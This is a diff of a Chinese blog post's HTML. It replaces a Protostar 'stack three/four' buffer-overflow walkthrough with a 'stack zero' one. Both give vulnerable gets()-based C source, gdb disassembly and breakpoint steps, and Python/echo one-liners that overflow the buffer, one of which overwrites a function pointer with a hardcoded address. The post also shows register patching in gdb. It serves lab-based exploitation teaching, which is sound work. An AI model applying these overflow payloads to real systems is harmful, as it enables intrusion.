@@ -4,10 +4,13 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="8023">
-    <meta name="description" content="Pwn-protostar靶场3 stack three，stack fourStack Three程序静态分析stack three源码：
-#include &amp;lt;stdlib.h&gt;
-#include &amp;lt;unistd.h&gt;
+    <meta name="keywords" content="Pwn-protostar靶场1 stack_zero, 8023">
+    <meta name="description" content="
+
+Pwn-protostar靶场1  stack_zero本靶场所有程序源码包括靶场虚拟机镜像地址
+https:&amp;#x2F;&amp;#x2F;exploit.education&amp;#x2F;protostar
+
+stack zero源码：
 #in">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -20,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>8023</title>
+    <title>Pwn-protostar靶场1 stack_zero | 8023</title>
     <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
     
 
@@ -306,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title"></h1>
+                    <h1 class="description center-align post-title">Pwn-protostar靶场1 stack_zero</h1>
                 </div>
             </div>
         </div>
@@ -333,12 +336,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0/" class="post-category">
+                                学习
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -347,28 +363,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-01-03
+                    2024-11-11
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-11
+                    2025-01-03
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    7 分
                 </div>
                 
 
@@ -411,148 +427,160 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Pwn-protostar靶场3-stack-three，stack-four"><a href="#Pwn-protostar靶场3-stack-three，stack-four" class="headerlink" title="Pwn-protostar靶场3 stack three，stack four"></a>Pwn-protostar靶场3 stack three，stack four</h1><h2 id="Stack-Three"><a href="#Stack-Three" class="headerlink" title="Stack Three"></a>Stack Three</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack three源码：</p>
+                <span id="more"></span>
+
+<h1 id="Pwn-protostar靶场1-stack-zero"><a href="#Pwn-protostar靶场1-stack-zero" class="headerlink" title="Pwn-protostar靶场1  stack_zero"></a>Pwn-protostar靶场1  stack_zero</h1><p>本靶场所有程序源码包括靶场虚拟机镜像地址</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;exploit.education&#x2F;protostar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>stack zero源码：</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
-
-<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
 <span class="token punctuation">&#123;</span>
-  <span class="token keyword">volatile</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-  fp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-
+  modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"calling function pointer, jumping to 0x%08x\n"</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have changed the 'modified' variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p>这个程序首先定义了一个win函数</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="gets函数漏洞："><a href="#gets函数漏洞：" class="headerlink" title="gets函数漏洞："></a>gets函数漏洞：</h3><p><img src="/img/98395e2dd8699221a3b9fbf7a231cffc.png"> </p>
+<p>永远不要使用gets函数，因为如果事先不知道数据，就无法判断gets将读取多少个字符，因为gets将继续存储字符当超过缓冲区的末端时，使用它是极其危险的，它会破坏计算机安全，请改用fgets。 </p>
+<h2 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h2><p> 我们使用gdb打开程序进行进一步的分析 </p>
+<pre class="line-numbers language-none"><code class="language-none">gdb &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>调用这个win函数会输出code flow successfully changed，表示我们成功破解了程序</p>
-<p>然后在mian函数内定义了一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%8C%87%E9%92%88%E5%8F%98%E9%87%8F&spm=1001.2101.3001.7020">指针变量</a>fp和字符型变量buffer，buffer存储的字符大小为64位</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">volatile</span> <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/img/1731285612070.png"></p>
+<p>然后查看汇编代码，了解程序堆栈如何工作</p>
+<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel 参数让汇报代码美观一点
+disassemble main  显示所有的汇编程序指令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h4 id="什么是指针？"><a href="#什么是指针？" class="headerlink" title="什么是指针？"></a>什么是指针？</h4><p>在C语言中，指针是一种特殊的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B&spm=1001.2101.3001.7020">变量类型</a>，它存储了一个内存地址。这个内存地址可以是其他变量或数据结构在内存中的位置</p>
-<p>指针提供了直接访问和操作内存中数据的能力。通过指针，我们可以间接地访问、修改和传递数据，从而不需要直接对变量本身进行操作</p>
-<pre class="line-numbers language-none"><code class="language-none">fp &#x3D; 0;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/img/1731285694825.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">Dump of assembler code for function main:
+0x080483f4 &lt;main+0&gt;:    push   ebp
+0x080483f5 &lt;main+1&gt;:    mov    ebp,esp
+0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0
+0x080483fa &lt;main+6&gt;:    sub    esp,0x60
+0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0
+0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
+0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
+0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;
+0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
+0x08048415 &lt;main+33&gt;:   test   eax,eax
+0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
+0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
+0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
+0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
+0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
+0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;
+0x08048433 &lt;main+63&gt;:   leave
+0x08048434 &lt;main+64&gt;:   ret
+End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>将fp的值设为0表示一个无效的指针，即它不指向任何有效的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80&spm=1001.2101.3001.7020">内存地址</a>。这样做可以用来初始化指针变量，或者将指针重置为空指针</p>
-<p>之后程序会使用gets函数接收用户的输入，并将接受到的字符串存储在buffer变量里，gets函数是一个危险的函数，他会造成缓冲区溢出</p>
-<p> 程序接受输入后会进行一个if判断 </p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<p> 第一条是将ebp推入栈中，ebp是cpu的一个寄存器，它包含一个地址，指向堆栈中的某个位置，它存放着栈底的地址 </p>
+<p><img src="/img/1731285961101.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">0x080483f7 &lt;main+3&gt;:    and    esp,0xfffffff0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">if</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"calling function pointer, jumping to 0x%08x\n"</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p> AND 指令可以清除一个操作数中的 1 个位或多个位，同时又不影响其他位。这个技术就称为位屏蔽，就像在粉刷房子时，用遮盖胶带把不用粉刷的地方（如窗户）盖起来，在这里，它隐藏了esp的地址 </p>
+<pre class="line-numbers language-none"><code class="language-none">0x080483fa &lt;main+6&gt;:    sub    esp,0x60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>if(fp)检查fp是否指向了某个有效的函数。如果fp不为空（即非零），则输出calling function pointer, jumping to 0x%08x，然后执行函数指针 fp 所指向的函数</p>
-<p>也就是说，我们需要溢出覆盖fp设置的值，将fp原本的值改为win函数的地址，之后进入if判断后，会执行win函数</p>
-<h4 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h4><p>使用gdb打开程序，输入指令查看汇编代码</p>
-<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
-disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p> 然后esp减去0x60</p>
+<pre class="line-numbers language-none"><code class="language-none">0x080483fd &lt;main+9&gt;:    mov    DWORD PTR [esp+0x5c],0x0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731312941256.png" alt="1731312941256"></p>
-<p>程序最关键两行</p>
-<pre class="line-numbers language-none"><code class="language-none">0x08048471 &lt;main+57&gt;:   mov    eax,DWORD PTR [esp+0x5c]
-0x08048475 &lt;main+61&gt;:   call   eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p> 在内存移动的位置为0，在堆栈上的偏移为0x5c<br> 段地址+偏移地址=物理地址<br> <strong>举一个例子，你从家到学校有2000米，这2000米就是物理地址，你从家到医院有1500米，离学校还要500米，这剩下的500米就是偏移地址</strong> </p>
+<pre class="line-numbers language-none"><code class="language-none">0x08048405 &lt;main+17&gt;:   lea    eax,[esp+0x1c]
+0x08048409 &lt;main+21&gt;:   mov    DWORD PTR [esp],eax
+0x0804840c &lt;main+24&gt;:   call   0x804830c &lt;gets@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>它将esp+0x5c地址的值转移到了eax寄存器里，然后调用call指令执行eax寄存器里的值</p>
-<p>也就是说，我们只要将esp+0x5c地址的内容覆盖成win函数的地址，就能成功破解程序</p>
-<h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>我们在0x08048471地址处下一个断点</p>
-<pre class="line-numbers language-none"><code class="language-none">b *0x08048471 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> lea操作是取有效地址，也就是取esp地址+偏移地址0x1c处的堆栈<br> 然后DWORD PTR要取eax的地址到esp中<br> 调用gets函数 </p>
+<pre class="line-numbers language-none"><code class="language-none">0x08048411 &lt;main+29&gt;:   mov    eax,DWORD PTR [esp+0x5c]
+0x08048415 &lt;main+33&gt;:   test   eax,eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p> 然后设置一下自动运行的命令 </p>
-<pre class="line-numbers language-none"><code class="language-none">define hook-stop
-info registers   &#x2F;&#x2F;显示寄存器里的地址
+<p> 然后对比之前设置的值，0，用test来检查 </p>
+<p>接下来就是if的循环操作</p>
+<pre class="line-numbers language-none"><code class="language-none">0x08048417 &lt;main+35&gt;:   je     0x8048427 &lt;main+51&gt;
+0x08048419 &lt;main+37&gt;:   mov    DWORD PTR [esp],0x8048500
+0x08048420 &lt;main+44&gt;:   call   0x804832c &lt;puts@plt&gt;
+0x08048425 &lt;main+49&gt;:   jmp    0x8048433 &lt;main+63&gt;
+0x08048427 &lt;main+51&gt;:   mov    DWORD PTR [esp],0x8048529
+0x0804842e &lt;main+58&gt;:   call   0x804832c &lt;puts@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h2><h3 id="方法一：溢出"><a href="#方法一：溢出" class="headerlink" title="方法一：溢出"></a>方法一：溢出</h3><p>我们先在gets函数地址下一个断点，这样程序在运行到这个地址时会停止继续运行下一步操作。 </p>
+<pre class="line-numbers language-none"><code class="language-none">b *0x0804840c     #断点意思就是让程序执行到此“停住”，不再往下执行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 然后在调用gets函数后下一个断点，来看我们输入的字符串在哪里 </p>
+<pre class="line-numbers language-none"><code class="language-none">b *0x08048411<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/1731286435341.png"></p>
+<p>然后设置</p>
+<pre class="line-numbers language-none"><code class="language-none">define hook-stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 这个工具可以帮助我们在每一步操作停下来后，自动的运行我们设置的命令 </p>
+<pre class="line-numbers language-none"><code class="language-none">info registers   &#x2F;&#x2F;显示寄存器里的地址
 x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
 x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
-end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>运行程序，由于if判断，fp的值不能为零才能进入if判断，但是程序设置的fp的值为0，我们先输入一长串的垃圾字符，覆盖原来的值 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313027542.png" alt="1731313027542"></p>
-<p> 查看esp+0x5c地址处的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p> 然后我们输入run运行程序到第一个断点 </p>
+<p><img src="/img/1731286657496.png"></p>
+<p><img src="/img/1731286826301.png"></p>
+<p> 现在我们马上就要执行gets函数了，输入n执行gets函数（单步执行）</p>
+<p> 我们随意输入一些内容，按下回车键 </p>
+<p><img src="/img/1731286911539.png"></p>
+<p><img src="/img/1731287011867.png"></p>
+<p>可以看到0x61是a的ascii码</p>
+<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c            &#x2F;&#x2F;查看esp地址+0x5c偏移地址的内容<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313276304.png" alt="1731313276304"></p>
-<p>fp函数指针的值就在图中圈出来的地方，根据计算，我们需要64个字符+win函数地址才能控制fp函数指针</p>
-<p>这时候我们可以用objdump工具来查看win函数地址</p>
-<pre class="line-numbers language-none"><code class="language-none">objdump -x stack3 | grep win<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/img/1731287066725.png"></p>
+<p> 算了一下，我们需要68个字符才能覆盖(从第一个0x61开始一共有16个4字节才能到0x00000000，要覆盖他还有4字节，所以一共68个字节)<br> 输入q退出gdb<br> 然后使用echo或者python对程序进行输入(二选一)</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'print "a"*(16*4+4)'</span> <span class="token operator">|</span> <span class="token operator">/</span>opt<span class="token operator">/</span>protostar<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313336511.png" alt="1731313336511"></p>
-<p>或者直接gdb命令查看win地址</p>
-<pre class="line-numbers language-none"><code class="language-none">disassemble win<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; | &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;stack0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313490898.png" alt="1731313490898"></p>
-<p> 知道了win函数地址后，直接运行以下命令就能破解程序 </p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span><span class="token number">64</span>个垃圾字符<span class="token operator">+</span>win函数地址
-python <span class="token operator">-</span>c <span class="token string">"print('A'*(4*16)+'\x24\x84\x04\x08')"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>stack3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/img/1731287448288.png"></p>
+<p> 可以看到，我们已经成功打印出了正确的字符 </p>
+<h3 id="方式二：更改eip寄存器的值"><a href="#方式二：更改eip寄存器的值" class="headerlink" title="方式二：更改eip寄存器的值"></a>方式二：更改eip寄存器的值</h3><p>寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在<strong>64</strong>位程序里叫做<strong>RIP</strong>，<strong>他是程序的指针</strong>，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行<br>重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点</p>
+<pre class="line-numbers language-none"><code class="language-none">b main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313583965.png" alt="1731313583965"></p>
-<h2 id="Stack-Four"><a href="#Stack-Four" class="headerlink" title="Stack Four"></a>Stack Four</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack four源码：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<p> 运行程序到断点处 </p>
+<p> 查看所有寄存器的值 </p>
+<pre class="line-numbers language-none"><code class="language-none">info registers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
+<p><img src="/img/1731287668724.png"></p>
+<p><img src="/img/1731287789478.png"></p>
+<p> 我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd </p>
+<p> 查看程序汇编代码 </p>
+<p><img src="/img/1731287864176.png"></p>
+<p>如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the ‘modified’ variable也就是破解成功了<br>现在我们修改eip寄存器的值</p>
+<pre class="line-numbers language-none"><code class="language-none">set $eip&#x3D;0x8048419<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<p> 修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址 </p>
+<p><img src="/img/1731287958947.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">n &#x2F;&#x2F;执行下一个地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/img/1731287994713.png"></p>
+<p>破解成功</p>
+<h3 id="方式三：修改eax寄存器的值"><a href="#方式三：修改eax寄存器的值" class="headerlink" title="方式三：修改eax寄存器的值"></a>方式三：修改eax寄存器的值</h3><p> 最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the ‘modified’ variable </p>
+<p> 在对比的地方下一个断点 </p>
+<pre class="line-numbers language-none"><code class="language-none">b *0x08048415<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>这个程序很简单，就不多做介绍了，和上一个一模一样，只不过将设置的fp函数指针去掉了，我们需要自己控制程序指针进行跳转到win函数地址</p>
-<p>直接进行程序动态分析</p>
-<h3 id="程序动态分析-1"><a href="#程序动态分析-1" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>使用gdb打开程序，输入指令查看汇编代码</p>
-<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
-disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/img/1731288172489.png"></p>
+<p> 查看所有寄存器里的值 </p>
+<p><img src="/img/1731288229480.png"></p>
+<p> 修改eax寄存器里的值 </p>
+<pre class="line-numbers language-none"><code class="language-none">set $eax &#x3D; 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731313813226.png" alt="1731313813226"></p>
-<p> 代码很少，我们要做的只有一件事，控制ret指令的返回地址，让程序跳转到win函数地址执行参数 </p>
-<h4 id="leave和ret指令"><a href="#leave和ret指令" class="headerlink" title="leave和ret指令"></a>leave和ret指令</h4><p>在汇编语言中，ret指令用于从子程序返回到调用它的主程序。当执行到ret指令时，程序会跳转到主代码的地址，继续执行主程序的代码</p>
-<p>在汇编语言中，leave指令用于清空栈，它会清除我们这次运行程序时获取的用户输入之类的，还原之前的状态</p>
-<pre class="line-numbers language-none"><code class="language-none">mov esp,ebp
-pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>我们在leave指令的地址下一个断点</p>
-<pre class="line-numbers language-none"><code class="language-none">b *0x0804841d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314096507.png" alt="1731314096507"></p>
-<p> 运行程序，然后随便输入一些字符，然后查看栈里的内容，记录下来，之后会用到 </p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314372486.png" alt="1731314372486"></p>
-<p>然后输入n执行下一条指令ret，查看寄存器</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314261554.png" alt="1731314261554"></p>
-<p>当前eip寄存器的值为0xb7eadc76，也就是说，执行了ret指令后，程序回到了0xb7eadc76继续执行之后的命令</p>
-<p>但是返回的地址也是在栈中的</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314396651.png" alt="1731314396651"></p>
-<p> 根据计算，我们需要输入76个字符+win函数地址才能覆盖原来ret返回的地址，让程序跳转到win函数地址处执行</p>
-<p><img src="F:\Desktop\工具\二进制和逆向\img\1731314637239.png" alt="1731314637239"></p>
